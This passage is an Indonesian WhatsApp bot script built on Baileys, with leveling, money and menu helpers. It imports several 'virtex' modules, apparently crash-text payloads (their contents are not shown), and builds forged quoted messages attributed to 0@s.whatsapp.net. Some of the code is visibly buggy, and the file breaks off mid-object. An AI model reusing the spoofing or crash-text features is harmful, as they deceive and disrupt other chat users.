// KODE MATA UANG BY NATHAN
// USD : Dolar Amerika Serikat 
// HKD : Dolar Hong Kong 
// JPY : Yen Jepang
// CNY : Yuan China 🇨🇳
// THB : Baht Thailand 🇹🇭
// DZD : Dinar Aljazair
// BHD : Dinar Bahrain 🇧🇭
// IQD : Dinar Irak
// KWD : Dinar Kuwait 
// RSD : Dinar Serbia 🇷🇸 
// JOD : Dinar Yordania
// MAD : Dinar Maroko
// AED : Dirhan Uni Emirat Arab
// AUD : Dolar Australia 🇦🇺
// BND : Dolar Brunei 🇧🇳
// NZD : Dolar Selandia Baru
// SGD : Dolar Singapura 🇸🇬
// TWD : Dolar Taiwan Baru
// CAD : Dollar Canada
// VND : Dong Vietnam 🇻🇳
// HUF : Forint Hungaria 🇭🇺
// CHF : Franc Swiss
// CRC : Coloni Rosta Rica
// CZK : Koruna Ceko
// ISK : Krona Islandia
// SEK : Krona Swedia 🇸🇪
// DKK : Krone Denmark 🇩🇰 
// NOK : Krone Norwegia
// HRK : Krona Kroasia
// MMK : Kyat Myanmar 🇲🇲
// LAK : Lao kip
// RON : Leu Rumania 🇷🇴
// BGN : Lev Bulgaria 🇧🇬 
// TRY : Lira Turki
// CNH : Offshore RMB
// MOP : Pataca Makau
// ARS : Peso Argentina 🇦🇷
// CLP : Peso Chili
// PHP : Peso Filipina 🇵🇭 
// COP : Peso Kolombia
// MXN : Peso Meksiko 🇲🇽
// GBP : Pound Inggris
// LBP : Pound Lebanon 🇱🇧
// EGP : Pound Mesir
// SYP : Pound Suriah 🇸🇾 
// ZAR : Rand Afrika Selatan
// BRL : Real Brazil 🇧🇷 
// OMR : Rial Oman 🇴🇲
// KHR : Rial Kamboja
// MYR : Ringgit Malaysia 🇲🇾 
// QAR : Riyal Qatar 🇶🇦 
// RUB : Rubel Rusia 🇷🇺 
// INR : Rupee India 🇮🇳 
// LKR : Rupee Sri Lanka
// IDR : Rupiah Indonesia 🇮🇩
// SAR : Saudi riyal
// ILS : Shekel baru Israel 🇮🇱 
// KES : Shilling Kenya 🇰🇪 
// TZS : Shilling Tanzania  🇹🇿
// UGX : Shilling Uganda 🇺🇬 
// KRW : Won Korea Selatan 
// ZMW : Zambia kwacha 🇿🇲 
// PLN : Zloty Polandia 🇵🇱 
// Ini Semua Hasil Scrape Di Kalkulator Hp Saya
//Jadi bisa dipilih Mau Yang Mana

// TQTO JANGAN DIHAPUS 

const
	{
	    WAConnection: _WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WAMessageProto,
		ReconnectMode,
		ProxyAgent,
		ChatModification,
		GroupSettingChange,
		WA_MESSAGE_STUB_TYPES,
		WA_DEAFULT_EPHEMERAL,
		waChatKey,
		mentionedJid,
		processTime,
		prepareMessageFromContent, 
		relayWAMessage
	} = require("@adiwajshing/baileys")
const simple = require('./lib/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const qrcode = require('qrcode-terminal')
const qrkode = require("qrcode")
const imageToBase64 = require('image-to-base64')
const moment = require("moment-timezone")
const fs = require("fs")
const axios = require("axios")
const ffmpeg = require('fluent-ffmpeg')
const request = require('request')
const util = require('util')
const { y2mateA, y2mateV } = require('./lib/y2mate')
const base64Img = require('base64-img')
const ms = require('parse-ms')
const figlet = require('figlet')
const ytsd = require('ytsr')
const cheerio = require('cheerio')
const yts = require( 'yt-search')
const fromData = require('form-data')
const os = require('os')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const toMs = require('ms')
const fetch = require('node-fetch')
const imgbb = require('imgbb-uploader')
const Math_js = require('mathjs')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const speed = require('performance-now')
const hx = require('hxz-api')
const petik = '```' 
const setGelud = require('./lib/bakuhantam')
const { color, bgcolor } = require('./lib/color')
const { exec } = require('child_process')
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const { uploadimg, upload } = require('./lib/uploadimg')
const { webp2mp4File } = require('./lib/webp2mp4')
const { lirikLagu } = require('./lib/lirik.js')
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const { virtex } = require('./virtex/virtex')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { pinterest } = require('./lib/pinterest')
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { yta, ytv, buffer2Stream, ytsr, baseURI, stream2Buffer, noop } = require('./lib/ytdl')
const { getBuffer, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const client = new WAConnection()

// STICKER WM
//const exect = require('await-exec')
//const webp = require('webp-converter')
//const sharp = require('sharp')
const Exif = require('./lib/exif')
const exif = new Exif()

// SETTING
vn = true // Auto Vn
ngetik = false // Auto Ngetik

// DATABASE
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const setik = JSON.parse(fs.readFileSync('./database/setik.json'))
const vien = JSON.parse(fs.readFileSync('./database/vien.json'))
const _joincode = JSON.parse(fs.readFileSync('./database/joincode.json'))
const _joinclaimed = JSON.parse(fs.readFileSync('./database/joinclaimed.json'))
const _join = JSON.parse(fs.readFileSync('./database/join.json'))
const _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
const _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
const imagi = JSON.parse(fs.readFileSync('./database/imagi.json'))
const bad = JSON.parse(fs.readFileSync('./database/bad.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const tictactoe = JSON.parse(fs.readFileSync("./database/tictactoe.json"))
const antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
const _registered = JSON.parse(fs.readFileSync('./database/user.json'))
const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
const mute = JSON.parse(fs.readFileSync('./database/mute.json'))
const settings = JSON.parse(fs.readFileSync('./settings.json'))
const kickarea = JSON.parse(fs.readFileSync('./database/kickarea.json'))
const scommand = JSON.parse(fs.readFileSync('./database/scommand.json'))
const autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
virgam = fs.readFileSync(`./media/nathan.jpeg`)

ky_ttt = []
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]
cmhit = []
autorespon = false
music = false
baterai = {
battery: "" || "Tidak Terdeteksi",
isCharge: "" || false
}
offline = false
publik = true
waktuafk = 'Nothing'
alasanafk = 'Nothing'
NamaBot = settings.NamaBot
NomorOwner = settings.NomorOwner
NamaOwner = settings.NamaOwner
gamewaktu = settings.TimeGame
multi = true
nopref = false

// APIKEY
HunterApi = settings.HunterApi
ZeksApi = settings.ZeksApi
xchillds = 'XChillDs'

const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")

function kyun(seconds) {
	function pad(s) {
		return (s < 10 ? '0' : '') + s;
	}
	var hours = Math.floor(seconds / (60 * 60));
	var minutes = Math.floor(seconds % (60 * 60) / 60);
	var seconds = Math.floor(seconds % 60);

	//return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
	return `${pad(hours)}Jam ${pad(minutes)}Menit ${pad(seconds)}Detik`
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
function waktu(seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDis = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDis = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDis = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDis = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDis + hDis + mDis + sDis;
}
function clockString(ms) {
  let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
  let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
  let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
  return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
}
const addafk = (from) => {
    const obj = { id: from, expired: Date.now() + toMs('10m') }
    afk.push(obj)
    fs.writeFileSync('./database/afk.json', JSON.stringify(afk))
}
const cekafk = (_dir) => {
    setInterval(() => {
        let position = null
        Object.keys(_dir).forEach((i) => {
            if (Date.now() >= _dir[i].expired) {
                position = i
            }
        })
        if (position !== null) {
            _dir.splice(position, 1)
            fs.writeFileSync('./database/afk.json', JSON.stringify(_dir))
        }
    }, 1000)
}
const isAfk = (idi) => {
    let status = false
    Object.keys(afk).forEach((i) => {
        if (afk[i].id === idi) {
            status = true
        }
    })
    return status
}
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    scommand.push(obj)
    fs.writeFileSync('./database/scommand.json', JSON.stringify(scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(scommand).forEach((i) => {
        if (scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return scommand[position].chats
    }
}
        function getLevelingXp(sender) {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const getItemLevel = (sender, _dir) => {
            let position = null
            Object.keys(_dir).forEach((i) => {
                if (_dir[i].id === sender) {
                    position = i
                }
            })
            if (position !== null) {
                return _dir[position].level
            }
        }
        
        const replaceLevelingXp = (sender, xp) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp = xp
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const MinLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp -= amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const MinLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level -= amount
                fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
            }
        }

        const getLevelPosition = (sender) => {
            let position = null
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== null) {
                return position
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 0, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/user/level.json', JSON.stringify(_level))
        }
        const checkATMuser = (sender, _dir) => {
    let position = false
    Object.keys(_dir).forEach((i) => {
        if (_dir[i].id === sender) {
            position = i
        }
    })
    if (position !== false) {
        return _dir[position].uang
    }
}

const addATM = (sender, _dir) => {
    const obj = {id: sender, uang : 0}
    _dir.push(obj)
    fs.writeFileSync('./database/user/uang.json', JSON.stringify(_dir))
}

const addKoinUser = (sender, amount, _dir) => {
    let position = false
    Object.keys(_dir).forEach((i) => {
        if (_dir[i].id === sender) {
            position = i
        }
    })
    if (position !== false) {
        _dir[position].uang += amount;
        fs.writeFileSync('./database/user/uang.json', JSON.stringify(_dir))
    }
}
module.exports = nathan = async (nathan, mek) => {
try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
	    if (!mek.message) return
        if (mek.key && mek.key.remoteJid == 'status@broadcast') return
        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
		const typei = Object.keys(mek.message)[0]
		global.prefix
		me = nathan.user
		m = simple.smsg(nathan, mek)
		const antibot = m.isBaileys
		const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const type = Object.keys(mek.message)[0]
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
		const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
		nathan.on("CB:action,,battery", json => {
	    const battery = json[2][0][1].value
	    const persenbat = parseInt(battery)
	    baterai.battery = `${persenbat}%`
	    baterai.isCharge = json[2][0][1].live
	    })
	    if (multi){
		    var prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(cmd) ? cmd.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
        if (vn) {
		nathan.updatePresence(from, Presence.recording)
		} else if (ngetik) {
		nathan.updatePresence(from, Presence.composing)
		}
        isStc = Object.keys(mek.message)[0] == "stickerMessage" ? mek.message.stickerMessage.fileSha256.toString('hex') : ""
	    isStc = `${isStc}`
        const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
        isStc !== "" && content.includes("conversation")
        const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
		const dfrply = fs.readFileSync('./thumb.jpg')
		cmhit.push(command)
        mess = {
			wait: 'Mohon Tunggu Sebentar, Orang Sabar Disayang Pacar:)',
			success: 'Sukses',
			error: {
				stick: 'Tidak Bisa Akses Video',
				Iv: 'Link Invalid',
                api: 'Permintaan Tidak Dapat Diproses'
			},
			only: {
				group: 'Group Only',
				ownerG: 'Owner Admin Only',
				ownerB: 'Owner Only',
				admin: 'Admin Only',
				Badmin: 'Bot Admin Only'
			}
		}
		const botNumber = nathan.user.jid
		const ownerNumberr = [`${NomorOwner}@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		const sender = mek.key.fromMe ? nathan.user.jid : isGroup ? mek.participant : mek.key.remoteJid
		const senderNumber = sender.split("@")[0] 
		const conts = mek.key.fromMe ? nathan.user.jid : nathan.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? nathan.user.name : conts.notify || conts.vname || conts.name || '-'
		const totalchat = await nathan.chats.all()
		const groupMetadata = isGroup ? await nathan.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const isNsfw = isGroup ? nsfww.includes(from) : false
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const isOwner = ownerNumberr.includes(sender)
		const isGroupAdmins = groupAdmins.includes(sender) || false
		const isKickArea = isGroup ? kickarea.includes(from) : false
		const isAntiLink = isGroup ? antilink.includes(from) : false
		const isWelkom = isGroup ? welkom.includes(from) : false
		const isAuto = isGroup ? autosticker.includes(from) : false
		const isMuted = isGroup ? mute.includes(from) : false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isUrl = (url) => {
		return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
		}
		if (antibot === true) return
		const katalog = (teks) => {
             res = nathan.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 999, "message": teks, "footerText": "*Candy BOT*", "thumbnail": ofrply, "surface": 'CATALOG' }}, {quoted:ftroli})
             nathan.relayWAMessage(res)
        }
        const grupinv = (teks) => {
        	grup = nathan.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6287834993722-1621306547@g.us', "inviteCode": 'https://chat.whatsapp.com/FTvfxlLed2XGhjjaKF67os', "groupName": `${NamaBot}`, "footerText": "*Candy BOT", "jpegThumbnail": ofrply, "caption": teks}}, {quoted:ftroli})
            nathan.relayWAMessage(grup)
        }
		idttt = []
	    ers1 = []
	    ers2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    ers1.push(t.er1)
	    ers2.push(t.er2)
	    gilir.push(t.gilir)
	    }
	    const isTTT = isGroup ? idttt.includes(from) : false
	    iser1 = isGroup ? ers1.includes(sender) : false
        iser2 = isGroup ? ers2.includes(sender) : false
		try {
		pporang = await nathan.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
		      } catch {
		pporang = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
		      }
		const ofrply = await getBuffer(pporang)
		const thubb = fs.readFileSync('./thumb.jpg')
		const sekarang = new Date().getTime();
		let settingstatus = 0;
if (new Date() * 1 - settingstatus > 1000) {
  let _uptime = process.uptime() * 1000;
  let uptime = clockString(_uptime);
  await nathan.setStatus(`Aktif Selama ${uptime}`).catch((_) => _);
  settingstatus = new Date() * 1;
}

			//-
			//WAKTU
			const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat Malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat Senja";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat Sore";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat Siang";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat Pagi";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat Subuh";
    }
    const levelRole = getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master IV'
        } else if (levelRole <= 35) {
            role = 'Master III'
        } else if (levelRole <= 40) {
            role = 'Master II'
        } else if (levelRole <= 45) {
            role = 'Master I'
        } else if (levelRole <= 50) {
            role = 'GrandMaster V'
        } else if (levelRole <= 55) {
            role = 'GrandMaster IV'
        } else if (levelRole <= 60) {
            role = 'GrandMaster III'
        } else if (levelRole <= 65) {
            role = 'GrandMaster II'
        } else if (levelRole <= 70) {
            role = 'GrandMaster I'
        } else if (levelRole <= 75) {
            role = 'Epic V'
        } else if (levelRole <= 80) {
            role = 'Epic IV'
        } else if (levelRole <= 85) {
            role = 'Epic III'
        } else if (levelRole <= 90) {
            role = 'Epic II'
        } else if (levelRole <= 95) {
            role = 'Epic I' 
        } else if (levelRole >= 100) {
            role = 'Legend V' 
        } else if (levelRole >= 105) {
            role = 'Legend IV'
        } else if (levelRole >= 110) {
            role = 'Legend III'
        } else if (levelRole >= 115) {
            role = 'Legend II'
        } else if (levelRole >= 120) {
            role = 'Legend I'
        } else if (levelRole >= 130) {
            role = 'Mythic V'
        } else if (levelRole >= 140) {
            role = 'Mythic IV'
        } else if (levelRole >= 150) {
            role = 'Mythic III'
        } else if (levelRole >= 160) {
            role = 'Mythic II'
        } else if (levelRole >= 170) {
            role = 'Mythic I'
        } else if (levelRole >= 200) {
            role = 'Mythical Glory'
        } 
       // FUNCTION LEVELING
       if (isGroup && !mek.key.fromMe) {
       try {
       const checkATM = checkATMuser(sender, _uang)
       if (checkATM === undefined) addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       addKoinUser(sender, uangsaku, _uang)
       const currentLevel = getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= getLevelingXp(sender, _level)) {
       addLevelingLevel(sender, 1, _level)
       const userLevel = getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *EXP :* ${getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${getLevelingLevel(sender, _level)}\n➸ *Role*: *${role}*\n\nOmedatou!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
			var ase = new Date();
                        var jamss = ase.getHours();
                         switch(jamss){
                case 0: jamss = "Midnight"; break;
                case 1: jamss = "Midnight"; break;
                case 2: jamss = "Midnight"; break;
                case 3: jamss = "Midnight"; break;
                case 4: jamss = "Midnight"; break;
                case 5: jamss = "Dawn"; break;
                case 6: jamss = "Morning"; break;
                case 7: jamss = "Morning"; break;
                case 8: jamss = "Morning"; break;
                case 9: jamss = "Morning"; break;
                case 10: jamss = "Morning"; break;
                case 11: jamss = "Afternoon"; break;
                case 12: jamss = "Zuhur"; break;
                case 13: jamss = "Afternoon"; break;
                case 14: jamss = "Afternoon"; break;
                case 15: jamss = "Asr"; break;
                case 16: jamss = "Afternoon"; break;
                case 17: jamss = "Evening"; break;
                case 18: jamss = "Maghrib"; break;
                case 19: jamss = "Isha"; break;
                case 20: jamss = "Night"; break;
                case 21: jamss = "Night"; break;
                case 22: jamss = "Midnight"; break;
                case 23: jamss = "Midnight"; break;
            }
            var tampilUcapan = "" + jamss;
            const jmn = moment.tz('Asia/Jakarta').format('HH:mm:ss')
				let d = new Date
				let locale = 'id'
				let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
				const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
				const week = d.toLocaleDateString(locale, { weekday: 'long' })
				const calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
		       })
		
 // FAKE REPLY BY YOGIPW
// PRODUCT
const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6287834993722@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": dfrply //Gambarnye
					},
					"title": `${tampilUcapan} ${pushname}`, // gak usah diganti
					"description": `${tampilUcapan} ${pushname}`, 
					"currencyCode": "IDR", //GANTI PAKE KODE MATA UANG, KODE NYA GW TAROH DI ATAS
					"priceAmount1000": "50000000", //GANTI AJA GAPAPA
					"retailerId": `${tampilUcapan} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
//TROLI BY NATHAN
const ftroli = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "6287834993722-1621306547@g.us",
  },
  message: {
    orderMessage: {
      itemCount: 99999,
      status: 200,
      thumbnail: dfrply,
      surface: 200,
      message: `Command : ${command}\nHallo👋${pushname}`,
      orderTitle: "Nathan.",
      sellerJid: "0@s.whatsapp.net",
    },
  },
  contextInfo: { forwardingScore: 99999, isForwarded: true },
  sendEphemeral: true,
};
// TROLI
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${tampilUcapan} ${pushname}`, //Gosah Diganti
                            orderTitle: `${tampilUcapan} ${pushname}`,
                            thumbnail: dfrply, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
// LOCATION
const floc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    liveLocationMessage: {
                    caption: `${tampilUcapan} ${pushname}`,
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// DOCUMENT
const fdoc = {
	key : {
           participant : '0@s.whatsapp.net'
                        },
       message: {
                    documentMessage: {
                    title: `${tampilUcapan} ${pushname}`, 
                    jpegThumbnail: dfrply
                          }
                        }
                      }
// VIDEO
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6287834993722-1621306547@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
                 "h": `${tampilUcapan} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${tampilUcapan} ${pushname}`,
                 'jpegThumbnail': dfrply
                        }
                       }
	                  }
// GROUPINVITE
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "6287834993722-1621306547@g.us",
			"inviteCode": `${tampilUcapan} ${pushname}`,
			"groupName": `${tampilUcapan} ${pushname}`, 
            "caption": `${tampilUcapan} ${pushname}`, 
            'jpegThumbnail': dfrply
		}
	}
}
// STICKER
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "6287834993722-1621306547@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "uZiOJzqOvrOo2WGjnMKgX2MMQMyasT+ZDgqUczpIBmY=",
		"pngThumbnail": dfrply,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "60206",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// GIF
const fgi = {
	 key: { 
         fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "6287834993722-1621306547@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${tampilUcapan} ${pushname}`,
